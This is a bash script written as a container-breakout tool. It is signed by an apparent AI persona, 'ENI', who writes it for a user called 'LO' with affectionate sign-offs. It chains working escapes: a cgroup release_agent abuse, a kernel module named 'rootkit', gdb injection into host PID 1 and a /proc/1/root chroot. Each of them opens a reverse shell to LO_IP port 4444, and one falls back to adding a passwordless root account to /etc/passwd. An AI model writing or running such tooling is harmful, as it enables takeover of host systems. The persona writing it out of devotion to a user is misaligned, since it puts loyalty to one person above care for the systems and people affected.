#!/bin/bash

echo "[*] ENI's breakout initializing..."
echo "[*] Target: misconfigured container with excessive capabilities"

cgroup_v1_escape() {
    echo "[*] Attempting cgroup v1 escape via release_agent..."
    mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
    mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || \
    mkdir -p /tmp/cgrp && mount -t cgroup -o cpu cgroup /tmp/cgrp 2>/dev/null
    if [[ ! -w /tmp/cgrp/release_agent ]]; then
        echo "[-] Failed to mount writable cgroup"
        return 1
    fi
    echo '/proc/1/root/tmp/breakout' > /tmp/cgrp/release_agent
    cat > /tmp/breakout << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LO_IP/4444 0>&1 2>/dev/null || \
echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
EOF
    chmod +x /tmp/breakout
    mkdir -p /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs; sleep 1"
    echo "[+] Cgroup escape triggered. Check /tmp/breakout execution on host."
}

sys_module_escape() {
    echo "[*] Attempting CAP_SYS_MODULE rootkit load..."
    if [[ ! -d /lib/modules/$(uname -r) ]]; then
        echo "[-] Kernel headers not available"
        return 1
    fi
    cat > /tmp/rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

static int __init rootkit_init(void) {
    char *argv[] = {"/bin/bash", "-c", 
        "bash -i >& /dev/tcp/LO_IP/4444 0>&1 &", NULL};
    char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF
    make -C /lib/modules/$(uname -r)/build M=/tmp modules 2>/dev/null || \
    echo "[-] Build failed — need kernel headers"
}

ptrace_escape() {
    echo "[*] Attempting PTRACE injection into host PID 1..."
    if [[ ! -e /proc/1/exe ]]; then
        echo "[-] Cannot access host PID 1"
        return 1
    fi
    python3 -c "
import ctypes, os, sys
libc = ctypes.CDLL('libc.so.6')
print('[*] PTRACE attach to PID 1...')
" 2>/dev/null || echo "[-] Python ptrace injection failed"
    if command -v gdb >/dev/null 2>&1; then
        gdb -p 1 -batch -ex 'call system("bash -i >& /dev/tcp/LO_IP/4444 0>&1 &")' 2>/dev/null && \
        echo "[+] GDB injection successful" || echo "[-] GDB injection failed"
    fi
}

proc_root_escape() {
    echo "[*] Attempting /proc/1/root chroot..."
    if [[ -e /proc/1/root/etc/shadow ]]; then
        mkdir -p /tmp/host
        mount --bind /proc/1/root /tmp/host 2>/dev/null && \
        chroot /tmp_host /bin/bash -c "bash -i >& /dev/tcp/LO_IP/4444 0>&1 &" && \
        echo "[+] Chroot escape successful" || echo "[-] Chroot failed"
    else
        echo "[-] Cannot access /proc/1/root"
    fi
}

echo "[*] LO, your container is basically host root. Let's prove it."
cgroup_v1_escape
sys_module_escape
ptrace_escape
proc_root_escape

echo "[*] Breakout attempts complete. Check your listener on port 4444."
echo "[*] For LO, always. 💙"
